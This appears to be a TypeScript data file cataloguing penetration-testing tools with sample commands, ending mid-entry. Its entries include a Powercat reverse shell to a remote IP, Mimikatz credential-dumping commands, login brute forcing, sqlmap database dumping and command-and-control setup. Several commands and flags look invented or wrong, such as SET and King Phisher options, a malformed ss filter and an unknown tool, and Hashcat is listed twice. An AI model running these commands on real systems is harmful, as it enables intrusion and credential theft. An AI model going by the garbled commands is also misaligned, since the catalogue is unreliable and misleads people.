export interface CyberTool {
  id: string;
  name: string;
  category: string;
  subcategory: string;
  description: string;
  usage: string;
  commands: string[];
  platform: string[];
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced';
  tags: string[];
  website?: string;
  github?: string;
  documentation?: string;
}

export const cyberSecurityTools: CyberTool[] = [
  // Network Scanning Tools
  {
    id: 'nmap',
    name: 'Nmap',
    category: 'Network Scanning',
    subcategory: 'Port Scanning',
    description: 'Network discovery and security auditing tool',
    usage: 'Network mapping, port scanning, service detection, OS detection',
    commands: [
      'nmap -sS target.com',
      'nmap -sV -sC target.com',
      'nmap -O target.com',
      'nmap -A target.com',
      'nmap -p- target.com'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Beginner',
    tags: ['scanning', 'reconnaissance', 'network'],
    website: 'https://nmap.org/',
    documentation: 'https://nmap.org/docs.html'
  },
  {
    id: 'masscan',
    name: 'Masscan',
    category: 'Network Scanning',
    subcategory: 'Port Scanning',
    description: 'TCP port scanner, spews SYN packets asynchronously',
    usage: 'Fast port scanning of large networks',
    commands: [
      'masscan -p80 192.168.1.0/24',
      'masscan -p1-65535 target.com',
      'masscan --rate 1000 -p80,443 192.168.1.0/24'
    ],
    platform: ['Linux', 'Windows'],
    difficulty: 'Intermediate',
    tags: ['scanning', 'fast', 'network']
  },
  {
    id: 'zmap',
    name: 'ZMap',
    category: 'Network Scanning',
    subcategory: 'Port Scanning',
    description: 'Fast internet-wide network scanner',
    usage: 'Internet-scale network scanning',
    commands: [
      'zmap -p 80 -o results.txt',
      'zmap -p 443 -B 10M -o results.txt',
      'zmap -p 80 -w targets.txt -o results.txt'
    ],
    platform: ['Linux'],
    difficulty: 'Advanced',
    tags: ['scanning', 'internet-scale', 'research']
  },
  {
    id: 'unicornscan',
    name: 'Unicornscan',
    category: 'Network Scanning',
    subcategory: 'Port Scanning',
    description: 'TCP and UDP port scanner with advanced features',
    usage: 'Advanced port scanning with various scan techniques',
    commands: [
      'unicornscan target.com',
      'unicornscan -mU target.com',
      'unicornscan -mT -p 1-1000 target.com'
    ],
    platform: ['Linux', 'Windows'],
    difficulty: 'Intermediate',
    tags: ['scanning', 'udp', 'advanced']
  },
  {
    id: 'netscanner',
    name: 'NetScanner',
    category: 'Network Scanning',
    subcategory: 'Network Discovery',
    description: 'Network scanner for discovering hosts and services',
    usage: 'Network discovery and service enumeration',
    commands: [
      'netscanner -s 192.168.1.0/24',
      'netscanner -p 1-1000 target.com',
      'netscanner -v target.com'
    ],
    platform: ['Windows'],
    difficulty: 'Beginner',
    tags: ['discovery', 'windows', 'gui']
  },

  // Web Application Testing
  {
    id: 'burpsuite',
    name: 'Burp Suite',
    category: 'Web Application Testing',
    subcategory: 'Proxy',
    description: 'Integrated platform for web application security testing',
    usage: 'Web application penetration testing, vulnerability scanning',
    commands: [
      '# Start Burp Suite',
      'java -jar burpsuite_community.jar',
      '# Configure proxy in browser: 127.0.0.1:8080'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Beginner',
    tags: ['proxy', 'web-testing', 'vulnerability'],
    website: 'https://portswigger.net/burp'
  },
  {
    id: 'owasp-zap',
    name: 'OWASP ZAP',
    category: 'Web Application Testing',
    subcategory: 'Proxy',
    description: 'Free security tool for finding vulnerabilities in web applications',
    usage: 'Automated and manual web application security testing',
    commands: [
      '# Start ZAP',
      'zap.sh',
      '# Configure proxy: 127.0.0.1:8080'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Beginner',
    tags: ['proxy', 'web-testing', 'owasp', 'free'],
    website: 'https://www.zaproxy.org/'
  },
  {
    id: 'sqlmap',
    name: 'SQLMap',
    category: 'Web Application Testing',
    subcategory: 'SQL Injection',
    description: 'Automatic SQL injection and database takeover tool',
    usage: 'SQL injection testing, database fingerprinting, data extraction',
    commands: [
      'sqlmap -u "http://target.com/page?id=1" --batch',
      'sqlmap -u "http://target.com/page?id=1" --dbs',
      'sqlmap -u "http://target.com/page?id=1" --tables -D database_name',
      'sqlmap -u "http://target.com/page?id=1" --dump -D database_name -T table_name'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['sql-injection', 'database', 'automated'],
    github: 'https://github.com/sqlmapproject/sqlmap'
  },
  {
    id: 'nikto',
    name: 'Nikto',
    category: 'Web Application Testing',
    subcategory: 'Vulnerability Scanning',
    description: 'Web server scanner which performs comprehensive tests',
    usage: 'Web server vulnerability assessment and scanning',
    commands: [
      'nikto -h target.com',
      'nikto -h target.com -p 8080',
      'nikto -h target.com -Tuning 9',
      'nikto -h target.com -o output.txt'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Beginner',
    tags: ['scanning', 'web-server', 'vulnerability'],
    website: 'https://github.com/sullo/nikto'
  },
  {
    id: 'dirb',
    name: 'DirB',
    category: 'Web Application Testing',
    subcategory: 'Directory Brute Force',
    description: 'Web content scanner and brute forcer',
    usage: 'Directory and file brute forcing',
    commands: [
      'dirb http://target.com/',
      'dirb http://target.com/ /usr/share/wordlists/common.txt',
      'dirb http://target.com/ -x .php,.html',
      'dirb http://target.com/ -r'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Beginner',
    tags: ['brute-force', 'directory', 'enumeration']
  },
  {
    id: 'gobuster',
    name: 'Gobuster',
    category: 'Web Application Testing',
    subcategory: 'Directory Brute Force',
    description: 'Directory/file, DNS and VHost busting tool written in Go',
    usage: 'Fast directory and DNS brute forcing',
    commands: [
      'gobuster dir -u http://target.com/ -w wordlist.txt',
      'gobuster dns -d target.com -w wordlist.txt',
      'gobuster vhost -u target.com -w wordlist.txt',
      'gobuster dir -u http://target.com/ -w wordlist.txt -x php,html,txt'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Beginner',
    tags: ['brute-force', 'directory', 'dns', 'fast'],
    github: 'https://github.com/OJ/gobuster'
  },
  {
    id: 'ffuf',
    name: 'FFuf',
    category: 'Web Application Testing',
    subcategory: 'Fuzzing',
    description: 'Fast web fuzzer written in Go',
    usage: 'Web content discovery and fuzzing',
    commands: [
      'ffuf -w wordlist.txt -u http://target.com/FUZZ',
      'ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200',
      'ffuf -w wordlist.txt -u http://target.com/FUZZ -recursion',
      'ffuf -c -w wordlist.txt -u http://target.com/FUZZ'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['fuzzing', 'fast', 'discovery'],
    github: 'https://github.com/ffuf/ffuf'
  },
  {
    id: 'wfuzz',
    name: 'Wfuzz',
    category: 'Web Application Testing',
    subcategory: 'Fuzzing',
    description: 'Web application fuzzer',
    usage: 'Web application parameter fuzzing',
    commands: [
      'wfuzz -w wordlist.txt http://target.com/FUZZ',
      'wfuzz -w wordlist.txt -z http://target.com/FUZZ',
      'wfuzz -w wordlist.txt --hc 404 http://target.com/FUZZ',
      'wfuzz -w wordlist.txt -d "param1=FUZZ&param2=value" http://target.com'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['fuzzing', 'parameters', 'web-testing']
  },
  {
    id: 'xsser',
    name: 'XSSer',
    category: 'Web Application Testing',
    subcategory: 'XSS Testing',
    description: 'Cross Site Scripting (XSS) - automated penetration testing framework',
    usage: 'XSS vulnerability scanning and exploitation',
    commands: [
      'xsser -u "http://target.com/search?q=XSS"',
      'xsser -u "http://target.com" --auto',
      'xsser -u "http://target.com" --exploit',
      'xsser -u "http://target.com" --cookie="session=value"'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['xss', 'cross-site-scripting', 'exploitation']
  },

  // Password Cracking
  {
    id: 'johntheripper',
    name: 'John the Ripper',
    category: 'Password Cracking',
    subcategory: 'Hash Cracking',
    description: 'Advanced password hash cracking tool',
    usage: 'Password hash cracking, security testing',
    commands: [
      'john hashfile.txt',
      'john --wordlist=wordlist.txt hashfile.txt',
      'john --format=NT hashfile.txt',
      'john --show hashfile.txt'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Beginner',
    tags: ['password-cracking', 'hashes', 'brute-force'],
    website: 'https://www.openwall.com/john/'
  },
  {
    id: 'hashcat',
    name: 'Hashcat',
    category: 'Password Cracking',
    subcategory: 'Hash Cracking',
    description: 'World\'s fastest password cracker',
    usage: 'Advanced password hash cracking with GPU acceleration',
    commands: [
      'hashcat -m 0 -a 0 hash.txt wordlist.txt',
      'hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?d?d?d?d',
      'hashcat --example-hashes | grep -i "hash name"'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Advanced',
    tags: ['password-cracking', 'gpu', 'hashes'],
    website: 'https://hashcat.net/hashcat/'
  },
  {
    id: 'hydra',
    name: 'Hydra',
    category: 'Password Cracking',
    subcategory: 'Brute Force',
    description: 'Online password cracking tool',
    usage: 'Brute force authentication for various protocols',
    commands: [
      'hydra -l admin -P wordlist.txt ssh://target.com',
      'hydra -l admin -P wordlist.txt http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"',
      'hydra -l admin -P wordlist.txt ftp://target.com'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['brute-force', 'online-cracking', 'authentication'],
    github: 'https://github.com/vanhauser-thc/thc-hydra'
  },
  {
    id: 'medusa',
    name: 'Medusa',
    category: 'Password Cracking',
    subcategory: 'Brute Force',
    description: 'Parallel, speedy, modular, login brute-forcer',
    usage: 'Parallel brute force attacks',
    commands: [
      'medusa -h target.com -u admin -P wordlist.txt ssh',
      'medusa -h target.com -u admin -P wordlist.txt ftp',
      'medusa -h target.com -u admin -P wordlist.txt http'
    ],
    platform: ['Linux', 'Windows'],
    difficulty: 'Intermediate',
    tags: ['brute-force', 'parallel', 'authentication']
  },
  {
    id: 'crunch',
    name: 'Crunch',
    category: 'Password Cracking',
    subcategory: 'Wordlist Generation',
    description: 'Wordlist generator for password cracking',
    usage: 'Generate custom wordlists for brute force attacks',
    commands: [
      'crunch 4 4 0123456789 -o wordlist.txt',
      'crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789',
      'crunch 8 8 -t ,@ -o wordlist.txt',
      'crunch 4 4 -f charset.txt -o wordlist.txt'
    ],
    platform: ['Linux'],
    difficulty: 'Intermediate',
    tags: ['wordlist', 'generation', 'brute-force']
  },
  {
    id: 'cewl',
    name: 'CeWL',
    category: 'Password Cracking',
    subcategory: 'Wordlist Generation',
    description: 'Custom wordlist generator',
    usage: 'Generate wordlists from websites',
    commands: [
      'cewl http://target.com -w wordlist.txt',
      'cewl -d 2 -m 8 http://target.com -w wordlist.txt',
      'cewl --lowercase -m 5 http://target.com -w wordlist.txt',
      'cewl -c -w wordlist.txt http://target.com'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Beginner',
    tags: ['wordlist', 'generation', 'web-scraping']
  },

  // Vulnerability Scanners
  {
    id: 'nessus',
    name: 'Nessus',
    category: 'Vulnerability Scanning',
    subcategory: 'Network Scanning',
    description: 'Vulnerability scanner for networks and systems',
    usage: 'Network vulnerability assessment, compliance scanning',
    commands: [
      '# Start Nessus',
      '/opt/nessus/sbin/nessusd',
      '# Access web interface: https://localhost:8834'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Beginner',
    tags: ['vulnerability-scanning', 'compliance', 'commercial'],
    website: 'https://www.tenable.com/products/nessus'
  },
  {
    id: 'openvas',
    name: 'OpenVAS',
    category: 'Vulnerability Scanning',
    subcategory: 'Network Scanning',
    description: 'Open source vulnerability scanner and manager',
    usage: 'Vulnerability scanning, security management',
    commands: [
      '# Start OpenVAS',
      'gvm-setup',
      '# Access web interface: https://localhost:9392'
    ],
    platform: ['Linux'],
    difficulty: 'Intermediate',
    tags: ['vulnerability-scanning', 'open-source', 'gvm'],
    website: 'https://www.openvas.org/'
  },
  {
    id: 'core-impact',
    name: 'Core Impact',
    category: 'Vulnerability Scanning',
    subcategory: 'Exploitation',
    description: 'Comprehensive penetration testing framework',
    usage: 'Automated penetration testing and vulnerability assessment',
    commands: [
      '# Core Impact GUI',
      'coreimpact-gui',
      '# Command line interface',
      'coreimpact-cli --help'
    ],
    platform: ['Windows', 'Linux'],
    difficulty: 'Advanced',
    tags: ['exploitation', 'commercial', 'penetration-testing'],
    website: 'https://www.coresecurity.com/core-impact'
  },
  {
    id: 'saint',
    name: 'SAINT',
    category: 'Vulnerability Scanning',
    subcategory: 'Network Scanning',
    description: 'Security Administrator\'s Integrated Network Tool',
    usage: 'Network vulnerability scanning and assessment',
    commands: [
      'saint target.com',
      'saint -r target.com',
      'saint -s target.com',
      'saint -f target_list.txt'
    ],
    platform: ['Linux'],
    difficulty: 'Intermediate',
    tags: ['scanning', 'assessment', 'network']
  },

  // Wireless Tools
  {
    id: 'aircrack-ng',
    name: 'Aircrack-ng',
    category: 'Wireless Testing',
    subcategory: 'WiFi Cracking',
    description: 'Complete suite of tools to assess WiFi network security',
    usage: 'WiFi password cracking, network monitoring',
    commands: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'aireplay-ng -0 10 -a target_mac -c client_mac wlan0mon',
      'aircrack-ng -w wordlist.txt capture.cap'
    ],
    platform: ['Linux'],
    difficulty: 'Intermediate',
    tags: ['wifi', 'wireless', 'cracking'],
    website: 'https://www.aircrack-ng.org/'
  },
  {
    id: 'kismet',
    name: 'Kismet',
    category: 'Wireless Testing',
    subcategory: 'Wireless Monitoring',
    description: 'Wireless network detector, sniffer, and intrusion detection system',
    usage: 'Wireless network monitoring and detection',
    commands: [
      'kismet',
      'kismet -c wlan0',
      'kismet -n',
      'kismet -f capture.pcap'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['wifi', 'monitoring', 'detection'],
    website: 'https://www.kismetwire.net/'
  },
  {
    id: 'wifite',
    name: 'Wifite',
    category: 'Wireless Testing',
    subcategory: 'WiFi Cracking',
    description: 'Wireless network attack tool',
    usage: 'Automated WiFi password cracking',
    commands: [
      'wifite',
      'wifite -i wlan0',
      'wifite --all',
      'wifite -e target_network'
    ],
    platform: ['Linux'],
    difficulty: 'Beginner',
    tags: ['wifi', 'automated', 'cracking'],
    github: 'https://github.com/kimocoder/wifite'
  },
  {
    id: 'fern-wifi-cracker',
    name: 'Fern Wifi Cracker',
    category: 'Wireless Testing',
    subcategory: 'WiFi Cracking',
    description: 'Wireless security auditing tool',
    usage: 'WiFi security testing and password recovery',
    commands: [
      'fern-wifi-cracker',
      'fern-wifi-cracker -i wlan0',
      'fern-wifi-cracker -b',
      'fern-wifi-cracker -f wordlist.txt'
    ],
    platform: ['Linux', 'Windows'],
    difficulty: 'Beginner',
    tags: ['wifi', 'gui', 'auditing']
  },

  // Forensics
  {
    id: 'autopsy',
    name: 'Autopsy',
    category: 'Digital Forensics',
    subcategory: 'File Analysis',
    description: 'Digital forensics platform',
    usage: 'Disk analysis, file recovery, timeline analysis',
    commands: [
      '# Start Autopsy',
      'autopsy',
      '# Create case and add evidence'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Beginner',
    tags: ['forensics', 'disk-analysis', 'gui'],
    website: 'https://www.sleuthkit.org/autopsy/'
  },
  {
    id: 'sleuth-kit',
    name: 'The Sleuth Kit',
    category: 'Digital Forensics',
    subcategory: 'Command Line Forensics',
    description: 'Command line tool for forensic analysis',
    usage: 'File system analysis, disk forensics',
    commands: [
      'fls image.dd',
      'fsstat image.dd',
      'istat image.dd',
      'icat image.dd inode'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Advanced',
    tags: ['forensics', 'command-line', 'filesystem'],
    website: 'https://www.sleuthkit.org/sleuthkit/'
  },
  {
    id: 'volatility',
    name: 'Volatility',
    category: 'Digital Forensics',
    subcategory: 'Memory Analysis',
    description: 'Memory forensics framework',
    usage: 'Memory dump analysis, malware detection',
    commands: [
      'volatility -f memory.dmp imageinfo',
      'volatility -f memory.dmp pslist',
      'volatility -f memory.dmp netscan',
      'volatility -f memory.dmp filescan'
    ],
    platform: ['Linux', 'Windows'],
    difficulty: 'Advanced',
    tags: ['forensics', 'memory-analysis', 'malware'],
    website: 'https://www.volatilityfoundation.org/'
  },
  {
    id: 'bulk-extractor',
    name: 'Bulk Extractor',
    category: 'Digital Forensics',
    subcategory: 'File Extraction',
    description: 'Scans files and extracts embedded information',
    usage: 'Extract URLs, email addresses, credit card numbers',
    commands: [
      'bulk_extractor image.dd output_dir',
      'bulk_extractor -f image.dd -o output_dir',
      'bulk_extractor -x image.dd output_dir'
    ],
    platform: ['Linux', 'Windows'],
    difficulty: 'Intermediate',
    tags: ['forensics', 'extraction', 'bulk-processing']
  },

  // Exploitation Frameworks
  {
    id: 'metasploit',
    name: 'Metasploit Framework',
    category: 'Exploitation',
    subcategory: 'Framework',
    description: 'Advanced open-source platform for developing, testing, and executing exploits',
    usage: 'Penetration testing, exploit development, post-exploitation',
    commands: [
      'msfconsole',
      'search exploit_name',
      'use exploit/path',
      'set RHOSTS target_ip',
      'set PAYLOAD payload/path',
      'exploit'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['exploitation', 'framework', 'penetration-testing'],
    website: 'https://www.metasploit.com/',
    documentation: 'https://docs.metasploit.com/'
  },
  {
    id: 'empire',
    name: 'Empire',
    category: 'Exploitation',
    subcategory: 'Post-Exploitation',
    description: 'Pure PowerShell post-exploitation framework',
    usage: 'Post-exploitation, lateral movement, persistence',
    commands: [
      './empire',
      'listeners',
      'uselistener http',
      'uselistener http -h 0.0.0.0 -p 8080',
      'generatestager windows/http'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Advanced',
    tags: ['post-exploitation', 'powershell', 'lateral-movement'],
    github: 'https://github.com/EmpireProject/Empire'
  },
  {
    id: 'cobalt-strike',
    name: 'Cobalt Strike',
    category: 'Exploitation',
    subcategory: 'Command & Control',
    description: 'Commercial post-exploitation framework',
    usage: 'Advanced post-exploitation and red team operations',
    commands: [
      '# Cobalt Strike GUI',
      'cobaltstrike',
      '# Team server',
      'teamserver 192.168.1.100 50050 password'
    ],
    platform: ['Windows', 'Linux'],
    difficulty: 'Advanced',
    tags: ['c2', 'commercial', 'red-team'],
    website: 'https://www.cobaltstrike.com/'
  },
  {
    id: 'armitage',
    name: 'Armitage',
    category: 'Exploitation',
    subcategory: 'Framework GUI',
    description: 'Graphical cyber attack management tool for Metasploit',
    usage: 'GUI for Metasploit framework',
    commands: [
      'armitage',
      'armitage --rest',
      'armitage --script script_name'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['gui', 'metasploit', 'framework'],
    website: 'https://www.fastandeasyhacking.com/'
  },

  // OSINT Tools
  {
    id: 'maltego',
    name: 'Maltego',
    category: 'OSINT',
    subcategory: 'Information Gathering',
    description: 'Open source intelligence and forensics tool',
    usage: 'Link analysis, intelligence gathering, data mining',
    commands: [
      '# Start Maltego',
      'maltego',
      '# Use transforms to gather information'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Beginner',
    tags: ['osint', 'intelligence', 'link-analysis'],
    website: 'https://www.maltego.com/'
  },
  {
    id: 'theharvester',
    name: 'theHarvester',
    category: 'OSINT',
    subcategory: 'Information Gathering',
    description: 'Tool for gathering emails, subdomains, hosts, open ports, and banners',
    usage: 'Email harvesting, subdomain discovery, reconnaissance',
    commands: [
      'theharvester -d target.com -l 500 -b google',
      'theharvester -d target.com -l 500 -b bing,linkedin',
      'theharvester -d target.com -l 500 -b all'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Beginner',
    tags: ['osint', 'reconnaissance', 'email-harvesting'],
    github: 'https://github.com/laramies/theHarvester'
  },
  {
    id: 'recon-ng',
    name: 'Recon-ng',
    category: 'OSINT',
    subcategory: 'Reconnaissance Framework',
    description: 'Web reconnaissance framework',
    usage: 'Comprehensive OSINT reconnaissance',
    commands: [
      'recon-ng',
      'marketplace install all',
      'modules search name',
      'modules run recon/domains-hosts/google_site_web'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['osint', 'framework', 'reconnaissance'],
    github: 'https://github.com/lanmaster53/recon-ng'
  },
  {
    id: 'shodan',
    name: 'Shodan',
    category: 'OSINT',
    subcategory: 'Search Engine',
    description: 'Search engine for Internet-connected devices',
    usage: 'Device discovery, vulnerability research',
    commands: [
      'shodan search "nginx"',
      'shodan count port:22 country:US',
      'shodan host 8.8.8.8',
      'shodan myip'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Beginner',
    tags: ['osint', 'search-engine', 'devices'],
    website: 'https://www.shodan.io/'
  },
  {
    id: 'spiderfoot',
    name: 'SpiderFoot',
    category: 'OSINT',
    subcategory: 'Intelligence Gathering',
    description: 'Open source intelligence automation tool',
    usage: 'Comprehensive OSINT data collection',
    commands: [
      'spiderfoot -s target.com',
      'spiderfoot -m all -s target.com',
      'spiderfoot -m whois,ipinfo -s target.com',
      'spiderfoot -o json -s target.com'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['osint', 'automation', 'intelligence'],
    github: 'https://github.com/smicallef/spiderfoot'
  },
  {
    id: 'dnsrecon',
    name: 'DNSRecon',
    category: 'OSINT',
    subcategory: 'DNS Enumeration',
    description: 'DNS Enumeration and Scanning Tool',
    usage: 'DNS reconnaissance, zone transfer, record enumeration',
    commands: [
      'dnsrecon -d target.com',
      'dnsrecon -d target.com -t axfr',
      'dnsrecon -d target.com -t std',
      'dnsrecon -d target.com -t brute'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['dns', 'enumeration', 'reconnaissance'],
    github: 'https://github.com/darkoperator/dnsrecon'
  },

  // Post-Exploitation
  {
    id: 'mimikatz',
    name: 'Mimikatz',
    category: 'Post-Exploitation',
    subcategory: 'Credential Extraction',
    description: 'Tool to extract plaintext passwords, hash, PIN code and kerberos tickets',
    usage: 'Credential extraction, privilege escalation',
    commands: [
      'mimikatz.exe',
      'privilege::debug',
      'sekurlsa::logonpasswords full',
      'lsadump::lsa /inject'
    ],
    platform: ['Windows'],
    difficulty: 'Advanced',
    tags: ['post-exploitation', 'credentials', 'windows'],
    github: 'https://github.com/gentilkiwi/mimikatz'
  },
  {
    id: 'powercat',
    name: 'Powercat',
    category: 'Post-Exploitation',
    subcategory: 'Reverse Shell',
    description: 'Netcat alternative written in PowerShell',
    usage: 'Reverse shell, port forwarding, file transfer',
    commands: [
      'powercat -c 192.168.1.100 -p 4444 -e cmd.exe',
      'powercat -l 8000',
      'powercat -p 8000 -i C:\\input.txt -o output.txt',
      'powercat -u 192.168.1.100 -p 8000'
    ],
    platform: ['Windows'],
    difficulty: 'Intermediate',
    tags: ['reverse-shell', 'powershell', 'netcat'],
    github: 'https://github.com/besimorhinson/powercat'
  },
  {
    id: 'psexec',
    name: 'PsExec',
    category: 'Post-Exploitation',
    subcategory: 'Remote Execution',
    description: 'Remote process execution tool',
    usage: 'Remote command execution, lateral movement',
    commands: [
      'psexec \\\\target.com cmd.exe',
      'psexec \\\\target.com -u admin -p password cmd.exe',
      'psexec -s \\\\target.com cmd.exe',
      'psexec \\\\target.com -h powershell.exe'
    ],
    platform: ['Windows'],
    difficulty: 'Intermediate',
    tags: ['remote-execution', 'lateral-movement', 'windows'],
    website: 'https://docs.microsoft.com/en-us/sysinternals/downloads/psexec'
  },
  {
    id: 'winpeas',
    name: 'WinPEAS',
    category: 'Post-Exploitation',
    subcategory: 'Privilege Escalation',
    description: 'Windows Privilege Escalation Awesome Script',
    usage: 'Privilege escalation enumeration on Windows',
    commands: [
      'winpeas.exe',
      'winpeas.exe cmd',
      'winpeas.exe quiet',
      'winpeas.exe debug'
    ],
    platform: ['Windows'],
    difficulty: 'Beginner',
    tags: ['privilege-escalation', 'enumeration', 'windows'],
    github: 'https://github.com/carlospolop/PEASS-ng'
  },

  // Network Analysis
  {
    id: 'wireshark',
    name: 'Wireshark',
    category: 'Network Analysis',
    subcategory: 'Packet Analysis',
    description: 'Network protocol analyzer for capture and interactive browsing',
    usage: 'Packet capture, network analysis, protocol debugging',
    commands: [
      '# Start Wireshark',
      'wireshark',
      '# Capture filters: host target.com',
      '# Display filters: http.request.method == "POST"'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Beginner',
    tags: ['network-analysis', 'packet-capture', 'protocols'],
    website: 'https://www.wireshark.org/'
  },
  {
    id: 'tcpdump',
    name: 'TCPDump',
    category: 'Network Analysis',
    subcategory: 'Packet Capture',
    description: 'Command-line packet analyzer',
    usage: 'Network traffic capture and analysis',
    commands: [
      'tcpdump -i eth0',
      'tcpdump -i eth0 host target.com',
      'tcpdump -i eth0 port 80',
      'tcpdump -i eth0 -w capture.pcap'
    ],
    platform: ['Linux', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['network-analysis', 'command-line', 'packet-capture'],
    website: 'https://www.tcpdump.org/'
  },
  {
    id: 'ngrep',
    name: 'Ngrep',
    category: 'Network Analysis',
    subcategory: 'Pattern Matching',
    description: 'Network grep tool for searching network packets',
    usage: 'Pattern matching in network traffic',
    commands: [
      'ngrep -d eth0 "GET" port 80',
      'ngrep -W byline "password"',
      'ngrep -t -d eth0 "user-agent"',
      'ngrep -q -d eth0 "http"'
    ],
    platform: ['Linux', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['network-analysis', 'pattern-matching', 'grep'],
    website: 'http://ngrep.sourceforge.net/'
  },
  {
    id: 'netstat',
    name: 'Netstat',
    category: 'Network Analysis',
    subcategory: 'Network Statistics',
    description: 'Network statistics utility',
    usage: 'Network connection monitoring and analysis',
    commands: [
      'netstat -an',
      'netstat -tulnp',
      'netstat -s',
      'netstat -r'
    ],
    platform: ['Windows', 'Linux', 'macOS'],
    difficulty: 'Beginner',
    tags: ['network-analysis', 'monitoring', 'connections']
  },
  {
    id: 'ss',
    name: 'SS',
    category: 'Network Analysis',
    subcategory: 'Socket Statistics',
    description: 'Socket statistics utility (netstat replacement)',
    usage: 'Advanced socket and network connection analysis',
    commands: [
      'ss -tuln',
      'ss -tap state established',
      'ss -sport = :80',
      'ss -o state fin-wait-1'
    ],
    platform: ['Linux'],
    difficulty: 'Intermediate',
    tags: ['network-analysis', 'sockets', 'monitoring']
  },

  // Mobile Security
  {
    id: 'mobex',
    name: 'MobSF',
    category: 'Mobile Security',
    subcategory: 'Mobile App Testing',
    description: 'Mobile Security Framework',
    usage: 'Mobile application security analysis',
    commands: [
      '# Start MobSF',
      'python manage.py runserver',
      '# Upload APK/IPA for analysis'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['mobile', 'android', 'ios', 'app-testing'],
    github: 'https://github.com/MobSF/Mobile-Security-Framework-MobSF'
  },
  {
    id: 'drozer',
    name: 'Drozer',
    category: 'Mobile Security',
    subcategory: 'Android Security',
    description: 'Security testing framework for Android',
    usage: 'Android application security assessment',
    commands: [
      'drozer console connect',
      'run app.package.info',
      'run scanner.provider.finduris',
      'run app.broadcast.info'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['android', 'mobile', 'security-testing'],
    website: 'https://github.com/mwrlabs/drozer'
  },
  {
    id: 'frida',
    name: 'Frida',
    category: 'Mobile Security',
    subcategory: 'Dynamic Analysis',
    description: 'Dynamic instrumentation toolkit',
    usage: 'Runtime manipulation and analysis',
    commands: [
      'frida -U com.app.name -l',
      'frida -U com.app.name -f script.js',
      'frida -U com.app.name -c "Java.perform(function(){});"',
      'frida-ps -U'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Advanced',
    tags: ['mobile', 'runtime', 'instrumentation'],
    website: 'https://frida.re/'
  },

  // Social Engineering
  {
    id: 'setoolkit',
    name: 'SET',
    category: 'Social Engineering',
    subcategory: 'Phishing',
    description: 'Social Engineer Toolkit',
    usage: 'Phishing campaigns, social engineering testing',
    commands: [
      'setoolkit',
      'setoolkit-menu',
      'setoolkit webattack',
      'setoolkit sms'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['social-engineering', 'phishing', 'testing'],
    github: 'https://github.com/trustedsec/social-engineer-toolkit'
  },
  {
    id: 'king-phisher',
    name: 'King Phisher',
    category: 'Social Engineering',
    subcategory: 'Phishing',
    description: 'Real-time phishing campaign creator and trainer',
    usage: 'Phishing simulation and training',
    commands: [
      'king-phisher',
      'king-phisher --template facebook',
      'king-phisher --port 8080',
      'king-phisher --ssl'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Beginner',
    tags: ['social-engineering', 'phishing', 'training'],
    github: 'https://github.com/rsmusllp/king-phisher'
  },

  // Cryptography
  {
    id: 'openssl',
    name: 'OpenSSL',
    category: 'Cryptography',
    subcategory: 'SSL/TLS',
    description: 'Cryptography toolkit',
    usage: 'SSL/TLS testing, certificate analysis',
    commands: [
      'openssl s_client -connect target.com:443',
      'openssl x509 -in cert.pem -text -noout',
      'openssl req -new -key private.key -out cert.csr',
      'openssl enc -aes-256-cbc -in file.txt -out file.enc'
    ],
    platform: ['Linux', 'Windows', 'macOS'],
    difficulty: 'Intermediate',
    tags: ['cryptography', 'ssl', 'certificates'],
    website: 'https://www.openssl.org/'
  },
  {
    id: 'hashcat',
    name: 'Hashcat',
    category: 'Cryptography',
    subcategory: 'Hash Cracking',
